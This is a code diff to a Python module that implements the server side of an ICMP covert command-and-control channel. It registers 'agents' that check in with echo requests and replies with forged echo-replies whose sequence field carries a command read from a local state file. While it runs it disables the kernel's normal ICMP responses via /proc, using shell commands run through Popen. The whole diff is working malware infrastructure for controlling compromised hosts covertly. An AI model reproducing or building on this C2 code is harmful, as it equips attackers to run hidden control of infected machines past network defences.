@@ -1,23 +1,38 @@
 import lib.icmp_common as icmp_common
 from subprocess import Popen
 import atexit
-from scapy.all import sniff
-import threading
+from scapy.all import sniff, send, ICMP, IP
 
 agent_table = {}
-c2_state = 0
 
 
 class c2Controller(icmp_common.absurdIcmp):
-    def __init__(self, sender_ip, identifier, sequence):
+    def __init__(self, agent_ip):
+        self.agent_ip = agent_ip
+        self._update_c2_state()
 
-        self.send_ip = sender_ip
+    def _update_c2_state(self):
+        with open("c2_state") as f:
+            file_state = f.readline().strip().upper()
 
-    def respond(identifier, sequence):
+        if file_state in self.c2_actions:
+            self.c2_state = file_state
+        else:
+            self.c2_state = "DO_NOTHING"
+
+    def respond(self, identifier, sequence):
         """
         TODO respond based on the current c2_state
         """
-        pass
+        self._update_c2_state()
+
+        print(f"ICMP Echo Received, responding {self.c2_state}")
+        reply = ICMP(
+            type="echo-reply", code=0, id=identifier, seq=self.c2_actions[self.c2_state]
+        )
+
+        # if dropped we'll just update on the next check in
+        send(IP(dst=self.agent_ip) / reply, verbose=False)
 
 
 def reenable_kernel_icmp():
@@ -30,28 +45,22 @@ def disable_kernel_icmp():
     Popen("echo 1 > /proc/sys/net/ipv6/icmp/echo_ignore_all", shell=True)
 
 
-def sync_c2_state():
-    """
-    TODO spawn a thread that updates the c2 state from a file every few seconds
-    """
-    pass
-
-
 def process_incoming_packets(pkt):
-
-    sender_ip = pkt[IP].src
-    sequence = pkt[IP].seq
-    identifier = pkt[IP].id
+    agent_ip = pkt[IP].src
+    sequence = pkt[IP][ICMP].seq
+    identifier = pkt[IP][ICMP].id
 
     # handle existing connections
-    if sequence == icmp_common.control_codes["C2_CHECK_IN"]:
-        if sender_ip in agent_table:
-            agent_table[sender_ip].respond(identifier, sequence)
-        else:
-            agent_table[sender_ip] = c2Controller(sender_ip, identifier, sequence)
+    if agent_ip in agent_table:
+        print("existing agent check-in")
+        agent_table[agent_ip].respond(identifier, sequence)
+    else:
+        print("new agent check-in")
+        agent_table[agent_ip] = c2Controller(agent_ip)
 
 
 def start():
     atexit.register(reenable_kernel_icmp)
     disable_kernel_icmp()
-    sniff(filter="icmp[icmptype] != icmp-echo", prn=process_incoming_packets)
+    print("awaiting agent check-in")
+    sniff(filter="icmp[icmptype] = icmp-echo", prn=process_incoming_packets)
